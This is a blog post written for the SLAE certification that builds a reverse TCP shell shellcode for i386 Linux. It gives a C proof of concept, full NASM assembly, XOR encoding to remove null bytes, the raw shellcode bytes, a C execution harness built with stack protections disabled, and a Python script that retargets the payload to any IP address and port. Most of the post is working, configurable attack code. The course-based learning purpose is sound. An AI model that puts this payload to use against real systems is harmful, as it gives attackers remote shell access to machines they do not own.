---
title: "Assignment #2: Create a reverse shell shellcode"
tags: [slae, shellcode, reverse shellcode, assembler, i386]
comments: true
share: true
order: 2
---

The second assignment for SLAE certification is to create a standard reverse shell TCP
shellcode in assembler language. The shellcode will reverse connect to a specific IP address on a given port spawning a shell on the waiting process.

The IP address and the port number to connect should be easily configurable.

The assignment was written on an Ubuntu Linux 18.04, with a Linux kernel 4.15
version.

## The POC

The PoC for the reverse shell shellcode is straightforwardly easy. The C code will:

* opens a socket
* set destination IP and destination port
* connects the socket to the designated endpoint 

If the connect() call is successfull, then standard output, standard input and
standard error on the socket descriptor are redirected on the connected socket
and then spawn the shell using execve() system call.

As in the first assignement, when execve() it has been executed, the code in
the process text segment is substituted with the shell one, so there is no need
for an exit() call at the end of the PoC.

{% highlight c %}
/*
 * tcp_reverse_shellcode.c: connects to a given IP address and TCP port and
 * spawn a shell when connection succeeded.
 *
 * BSD 2-Clause License
 *
 * Copyright (c) 2018, Paolo Perego
 * All rights reserved.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>

// for socket() and connect() calls
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>


#define IP 	"127.0.0.1"
#define DPORT	4444

int main(int argc, char **argv) {
	int sfd, ret;
	struct sockaddr_in peer;


	memset(&peer, 0, sizeof(struct sockaddr));

	peer.sin_family 	= AF_INET;
	peer.sin_port 	= htons(DPORT); 
	peer.sin_addr.s_addr = inet_addr(IP); 

	sfd = socket(AF_INET, SOCK_STREAM, 0);
	ret = connect(sfd, (const struct sockaddr *)&peer, sizeof(struct sockaddr_in));

	if ( ret == 0 ) {
		dup2(sfd, 0);
		dup2(sfd, 1);
		dup2(sfd, 2);
		execve((const char *)"/bin/sh", NULL, NULL);
		return 0;
	} 

	return -ret;
}


{% endhighlight %}

## PoC analysis

For all consideration and analysis about socket(), dup2() and execve() system
call please make sure to read the write-up for the [first
assignement](https://codiceinsicuro.it/slae/assignment-1-create-a-bind-shellcode/),
about creating a bind shell shellcode.

In this assignement our protagonist is the connect() and a little trick to
handle null bytes in our shellcode.

### connect()

All the lights are on the connect call in this assignment. The connect() will
create a link on the socket descriptor obtained by socket() to the destination
IP address and destination TCP port specifie in the (struct sockaddr *) data
structure.

{%highlight c%}

memset(&peer, 0, sizeof(struct sockaddr));

peer.sin_family 	= AF_INET;
peer.sin_port 	= htons(DPORT); 
peer.sin_addr.s_addr = inet_addr(IP); 

sfd = socket(AF_INET, SOCK_STREAM, 0);
ret = connect(sfd, (const struct sockaddr *)&peer, sizeof(struct sockaddr_in));

{%endhighlight%}

In our sample IP address is "127.0.0.1", localhost and the destination port is 4444.
Translating into assembler, there is no real magic. The system call we need is
362, and we need to push into the stack, the IP address an the TCP port in
network byte order.

{%highlight asm%}

; Connect to my peer
; 
; connect() is defined as #define __NR_connect 362 on  /usr/include/i386-linux-gnu/asm/unistd_32.h
; peer.sin_family 	= AF_INET;
; peer.sin_port 	= htons(DPORT); 
; peer.sin_addr.s_addr = inet_addr(IP); 
; ret = connect(sfd, (const struct sockaddr *)&peer, sizeof(struct sockaddr_in));

; 127 = 0x7f
; 0   = 0x0 
; 0   = 0x0 
; 1   = 0x1

push 0x0100007f
push word 0x5c11 	; port 4444 is 0x5c11
push word 0x2 		; AF_INET is 2


mov ecx, esp
mov dl, 0x10 ; sizeof(struct sockaddr_in)
xor eax, eax
mov ax, 0x16a
int 0x80 

{%endhighlight%}

If we put this implementation in our assembler file with socket(), dup2() and
execve() as the same as the first assignment, we obtain this code.
We compile it and we run it.

{% highlight asm %}
; Filename: 	tcp_reverse_shellcode.nasm
; Author:	Paolo Perego <paolo@codiceinsicuro.it>  
; Website:  	https://codiceinsicuro.it
; Twitter:    	@thesp0nge
; SLAE-ID:    	1217
; Purpose:	connect to a given IP and PORT and spawning a reverse shell if
;		connection succeded 


global _start			

section .text

_start:

	; Creating the socket.
	; 
	; int socket(int domain, int type, int protocol);
	; 
	; socket() is defined as #define __NR_socket 359 on /usr/include/i386-linux-gnu/asm/unistd_32.h
	; AF_INET is defined as 2 in /usr/include/i386-linux-gnu/bits/socket.h
	; SOCK_STREAM is defined as 1 in /usr/include/i386-linux-gnu/bits/socket_type.h
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx

	mov ax, 0x167
	mov bl, 0x2
	mov cl, 0x1
	int 0x80 ; sfd = socket(AF_INET, SOCK_STREAM, 0);
	mov ebx, eax ; storing the socket descriptor into EBX for next syscall

	; Connect to my peer
	; 
	; connect() is defined as #define __NR_connect 362 on  /usr/include/i386-linux-gnu/asm/unistd_32.h
	; peer.sin_family 	= AF_INET;
	; peer.sin_port 	= htons(DPORT); 
	; peer.sin_addr.s_addr = inet_addr(IP); 
	; ret = connect(sfd, (const struct sockaddr *)&peer, sizeof(struct sockaddr_in));

	; 127 = 0x7f
	; 0   = 0x0 
	; 0   = 0x0 
	; 1   = 0x1

	; push 0x0100007f
	mov eax, 0xfeffff80
	xor eax, 0xffffffff
	push eax
	push word 0x5c11 	; port 4444 is 0x5c11
	push word 0x2 		; AF_INET is 2
	

	mov ecx, esp
	mov dl, 0x10 ; sizeof(struct sockaddr_in)
	xor eax, eax
	mov ax, 0x16a
	int 0x80 

	test eax, eax ; check if eax is zero
	jnz exit_on_error
		

	; Duplicating descriptor 0, 1, 2 to the socket opened by client
	;
	; int dup2(int oldfd, int newfd);
	; 
	; dup2 is defined as #define __NR_dup2 63 in /usr/include/i386-linux-gnu/asm/unistd_32.h

	xor ecx, ecx
	mov cl,  2
	xor eax, eax

dup2:
	mov al, 0x3F	; 63 in decimal
	int 0x80	; duplicating file descriptors in backwards order; from 2 to 0
	dec ecx 
	jns dup2

	; Executing shell
	; 
	; int execve(const char *filename, char *const argv[], char *const envp[]);
	; execve() is defined as #define __NR_execve 11 on /usr/include/i386-linux-gnu/asm/unistd_32.h

	xor eax, eax
	push eax	; The NULL byte
	push 0x68732f2f ; "sh//". The second '\' is used to align our command into the stack
	push 0x6e69622f ; "nib/"
	mov ebx, esp	; EBX now points to "/bin//sh"
	
	xor ecx, ecx
	xor edx, edx
	mov al, 0xB	; 11 in decimal
	int 0x80

exit_on_error:
	mov bl, 0x1	
	xor eax, eax	; zero-ing EAX
	mov al, 0x1
	int 0x80

{%endhighlight%}

After having our reverse shell spawned, we're happy but everything changes when
we notice null bytes in the shellcode. When we store "127.0.0.1" we introduce
NULLs.

![There are null bytes in the shellcode]({{ "/assets/images/null_byte_in_working_shellcode.png" | absolute_url }})

I've got two paths here:

* change the destination IP address for my assignment. Says eth0:1 is bound to
  127.1.1.1 and override the problem.
* finding a good solution since IP addresses can have 0

The good solution I found, was to encode in some way the IP address I store
into the shellcode and then introduce some instructions to decode it before
putting into the stack.

From the logical operands math, there is one operator I can use to easily
decode an encoded value: XOR.

| A | B | A xor B |
|---|---|---------|
| 0 | 0 |    0    |
| 1 | 0 |    1    |
| 0 | 1 |    1    |
| 1 | 1 |    0    |

The interesting math property applied to XOR is that, given two numbers A and
B, if A XOR B = C, then C XOR B is equal to A.

In my code, A will be the IP address and B a value chosen as encoding KEY and C
the value I put in my shellcode to avoid 0 bytes. If in the assembly, I xor
again the encoded value with the same encoding key, I will obtain the starting
IP address value.

Choosing a good encoding key is the point. Connecting to "255.255.255.255", the
broadcasting address on a TCP connection is a non sense, so 0xFFFFFFFF can be a
good encoding key.

I xor-ed 0x0100007f with 0xffffffff and I putted the result into my assembly
code, in EAX register. Then I xor-ed EAX with 0xffffffff again and I pushed the
resulst into the stack.

{% highlight asm %}
mov eax, 0xfeffff80
xor eax, 0xffffffff
push eax
{%endhighlight%}

As you can see, now our shellcode still works and there are no NULL bytes into
it.

{% asciicast 181335 %}

### Error checking on connect()

As you may see, since the assignment requirement asked to spawn the reverse
shell if the connection succeeded, there is a small error check to make sure
the shellcode won't try to spawn a shell on a faulty socket descriptor.

{%highlight asm%}

...

test eax, eax ; check if eax is zero
jnz exit_on_error

...

exit_on_error:
	mov bl, 0x1	
	xor eax, eax	; zero-ing EAX
	mov al, 0x1
	int 0x80
{%endhighlight%}	

## The assembly code

Putting all pieces together, this is the second assignment solution in assembler.

{% highlight assembly %}
; Filename: 	tcp_reverse_shellcode.nasm
; Author:	Paolo Perego <paolo@codiceinsicuro.it>  
; Website:  	https://codiceinsicuro.it
; Twitter:    	@thesp0nge
; SLAE-ID:    	1217
; Purpose:	connect to a given IP and PORT and spawning a reverse shell if
;		connection succeded 


global _start			

section .text

_start:

	; Creating the socket.
	; 
	; int socket(int domain, int type, int protocol);
	; 
	; socket() is defined as #define __NR_socket 359 on /usr/include/i386-linux-gnu/asm/unistd_32.h
	; AF_INET is defined as 2 in /usr/include/i386-linux-gnu/bits/socket.h
	; SOCK_STREAM is defined as 1 in /usr/include/i386-linux-gnu/bits/socket_type.h
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx

	mov ax, 0x167
	mov bl, 0x2
	mov cl, 0x1
	int 0x80 ; sfd = socket(AF_INET, SOCK_STREAM, 0);
	mov ebx, eax ; storing the socket descriptor into EBX for next syscall

	; Connect to my peer
	; 
	; connect() is defined as #define __NR_connect 362 on  /usr/include/i386-linux-gnu/asm/unistd_32.h
	; peer.sin_family 	= AF_INET;
	; peer.sin_port 	= htons(DPORT); 
	; peer.sin_addr.s_addr = inet_addr(IP); 
	; ret = connect(sfd, (const struct sockaddr *)&peer, sizeof(struct sockaddr_in));

	; 127 = 0x7f
	; 0   = 0x0 
	; 0   = 0x0 
	; 1   = 0x1

	; push 0x0100007f
	mov eax, 0xfeffff80
	xor eax, 0xffffffff
	push eax
	push word 0x5c11 	; port 4444 is 0x5c11
	push word 0x2 		; AF_INET is 2
	

	mov ecx, esp
	mov dl, 0x10 ; sizeof(struct sockaddr_in)
	xor eax, eax
	mov ax, 0x16a
	int 0x80 

	test eax, eax ; check if eax is zero
	jnz exit_on_error
		

	; Duplicating descriptor 0, 1, 2 to the socket opened by client
	;
	; int dup2(int oldfd, int newfd);
	; 
	; dup2 is defined as #define __NR_dup2 63 in /usr/include/i386-linux-gnu/asm/unistd_32.h

	xor ecx, ecx
	mov cl,  2
	xor eax, eax

dup2:
	mov al, 0x3F	; 63 in decimal
	int 0x80	; duplicating file descriptors in backwards order; from 2 to 0
	dec ecx 
	jns dup2

	; Executing shell
	; 
	; int execve(const char *filename, char *const argv[], char *const envp[]);
	; execve() is defined as #define __NR_execve 11 on /usr/include/i386-linux-gnu/asm/unistd_32.h

	xor eax, eax
	push eax	; The NULL byte
	push 0x68732f2f ; "sh//". The second '\' is used to align our command into the stack
	push 0x6e69622f ; "nib/"
	mov ebx, esp	; EBX now points to "/bin//sh"
	
	xor ecx, ecx
	xor edx, edx
	mov al, 0xB	; 11 in decimal
	int 0x80

exit_on_error:
	mov bl, 0x1	
	xor eax, eax	; zero-ing EAX
	mov al, 0x1
	int 0x80

{% endhighlight %}

After having compiled the assembler source file with compile.sh script shell, I
used scdump.sh script to dump the shellcode.

{%highlight sh %}
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc3\xb8\x80\xff\xff\xfe\x83\xf0\xff\x50\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\xb2\x10\x31\xc0\x66\xb8\x6a\x01\xcd\x80\x85\xc0\x75\x24\x31\xc9\xb1\x02\x31\xc0\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xb3\x01\x31\xc0\xb0\x01\xcd\x80"

{%endhighlight %}

I added this shellcode into the same C program used in the first assignment to
test our shellcode and I executed it in order to check the payload is correct.

{%highlight c%}
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc3\xb8\x80\xff\xff\xfe\x83\xf0\xff\x50\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\xb2\x10\x31\xc0\x66\xb8\x6a\x01\xcd\x80\x85\xc0\x75\x24\x31\xc9\xb1\x02\x31\xc0\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xb3\x01\x31\xc0\xb0\x01\xcd\x80";

int main(int argc, char **argv)
{
	printf("Shellcode Length:  %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}
{%endhighlight%}

Please note that compile.sh script uses -fno-stack-protector -z execstack flags
in order to disable stack protection mechanisms in Linux Operating System.


## The configurator

And now, let's write some helper code in order to tweak our shellcode.
Assignment request was that both IP address and destination PORT number, would
be easy to configure.

The following python script takes two arguments, an IP and a port number
Both of them are putted in network by order and then translated do hexdecimal.

{% highlight python %}
#!/usr/bin/env python

import sys, socket, struct;
from operator import xor;

def xor_ip_address(original_ip):
    hex_bin_ip          = hex((struct.unpack("<L", socket.inet_aton(original_ip))[0]));
    s = str(hex(xor(long(hex_bin_ip, 16), 0xFFFFFFFF)))[:-1]
    h1 = s[2:4]
    h2 = s[4:6]
    h3 = s[6:8]
    h4 = s[8:10]

    if h1 == "":
        h1 = "00"
    if len(h1) == 1:
        h1 = "0" + h1

    if h2 == "":
        h2 = "00"
    if len(h2) == 1:
        h2 = "0" + h2
    if h3 == "":
        h3 = "00"
    if len(h3) == 1:
        h3 = "0" + h3
    if h4 == "":
        h4 = "00"
    if len(h4) == 1:
        h4 = "0" + h4

    return "\\x%s\\x%s\\x%s\\x%s" % (h4, h3,h2, h1)

def port_to_hex(port):

    if port < 1024 or port > 65535:
        print "[!] invalid TCP port number: " + str(port)
        sys.exit(-1)

    no_port = socket.htons(port);
    hex_no_port = hex(no_port)

    h1 = hex_no_port[2:4]
    h2 = hex_no_port[4:6]

    if h1 == "":
        h1 = "00"

    if len(h1) == 1:
        h1 = "0" + h1

    if h2 == "":
        h2 = "00"

    if len(h2) == 1:
        h2 = "0" + h2

    return "\\x%s\\x%s" % (h2, h1)

if (len(sys.argv) != 3):
    print ("usage: " + argv[0] + " ip port");
    sys.exit(-1);


xored_hex_bin_ip = xor_ip_address(sys.argv[1])
hex_port_number = port_to_hex(int(sys.argv[2]))

print "Creating TCP reverse shell shellcode for IP: " + sys.argv[1] + " on port: " + str(sys.argv[2])
print "XOR'ed IP address translation: " + xored_hex_bin_ip
print "Hex port number translation: " + hex_port_number

shellcode="\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc3\\xb8"+ xored_hex_bin_ip +"\\x83\\xf0\\xff\\x50\\x66\\x68" + hex_port_number + "\\x66\\x6a\\x02\\x89\\xe1\\xb2\\x10\\x31\\xc0\\x66\\xb8\\x6a\\x01\\xcd\\x80\\x85\\xc0\\x75\\x24\\x31\\xc9\\xb1\\x02\\x31\\xc0\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\x31\\xd2\\xb0\\x0b\\xcd\\x80\\xb3\\x01\\x31\\xc0\\xb0\\x01\\xcd\\x80"

print shellcode

{% endhighlight %}

## Code in action

Running our shellcode, we had a reverse shell on port 4444 on address 127.0.0.1
as shown in this video.

{% asciicast 181334 %}


Using scdump.sh helper, I extracted the shellcode from the binary tool and
inserted in the shellcode.c helper program.

{% highlight c %}
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"SHELLCODE";
		       
int main(int argc, char **argv)
{
	printf("Shellcode Length:  %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}
{% endhighlight %}

As you can see from the video, after compiling the C code, disabling stack
protection and run it.

On another terminal, there is a netcat listening on port 4444, waiting for
reverse connection. As you can see, reverse shell was successfully spawned on
connection.

{% asciicast 181389 %}

Now, with the python script I changed the reverse shell destination port to
1337 and as we can see our shellcode works as expected.

{% asciicast 180520 %}

## SLAE Exam Statement

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

[http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)

Student ID: SLAE-1217

